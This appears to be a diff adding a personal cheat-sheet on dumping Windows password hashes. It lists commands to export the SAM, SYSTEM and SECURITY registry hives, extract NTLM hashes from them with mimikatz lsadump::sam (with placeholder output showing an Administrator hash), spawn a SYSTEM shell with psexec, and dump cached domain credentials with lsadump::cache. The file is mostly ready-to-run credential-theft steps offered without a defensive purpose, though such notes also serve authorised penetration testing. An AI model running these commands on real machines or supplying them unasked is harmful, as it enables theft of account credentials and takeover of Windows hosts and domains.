@@ -1,0 +1,61 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  DUMPING WINDOWS HASHES, MIMIKATZ USAGE IN WINDOWS
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2022-03-03[Mar-Thu]15-49PM 
+
+##https://www.vanimpe.eu/2019/03/07/mimikatz-and-hashcat-in-practice/
+##https://robertscocca.medium.com/cracking-windows-hashes-fb0af3108c0a
+##https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/
+
+==
+DUMP REG HASHES TO FILE
+==
+
+reg save hklm\sam sam.dump
+reg save hklm\system system.dump
+reg save hklm\security security.dump
+
+==
+USE MIMIKATZ TO EXTRACT HASHES
+==
+
+mimikatz # lsadump::sam /sam:sam.dump /system:system.dump
+mimikatz lsadump::sam /sam:sam.dump /system:system.dump
+
+Domain : MACHINENAME
+SysKey : KEY
+Local SID : SID
+
+SAMKey : SAMKEY
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: HASH
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+
+==
+SUCCESSFUL DUMP OF DOMAIN CREDS WITH MIMIKATZ
+==
+
+OPEN CMD AS NTAUTHORITY\SYSTEM
+
+##http://woshub.com/runas-localsystem-account-windows/
+
+psexec -i -s cmd.exe
+c:\j\0\psexec -i -s cmd.exe
+
+RUN MIMIKATZ
+
+##https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
+
+.\mimikatz\mimikatz\Win32>mimikatz.exe
+
+lsadump::cache
